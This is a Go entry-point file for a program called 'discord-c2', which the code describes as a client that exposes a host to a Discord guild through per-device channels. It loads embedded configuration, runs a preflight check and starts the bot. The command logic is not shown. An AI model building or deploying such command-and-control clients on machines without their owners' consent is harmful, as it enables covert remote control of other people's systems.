// Command discord-c2 is a Go client that exposes a host to a Discord guild
// through a per-device channel.
package main

import (
	"log"
	"os"

	"discord-c2/internal/bot"
	"discord-c2/internal/config"
	"discord-c2/internal/preflight"
)

func main() {
	cfg, err := config.Load(embeddedEnv, ".env")
	if err != nil {
		log.Printf("%v", err)
		return
	}

	if len(os.Args) > 1 && (os.Args[1] == "--check" || os.Args[1] == "check") {
		if err := preflight.Run(cfg); err != nil {
			log.Printf("preflight: %v", err)
			os.Exit(1)
		}
		return
	}

	if err := bot.Run(cfg); err != nil {
		log.Printf("client stopped: %v", err)
	}
}
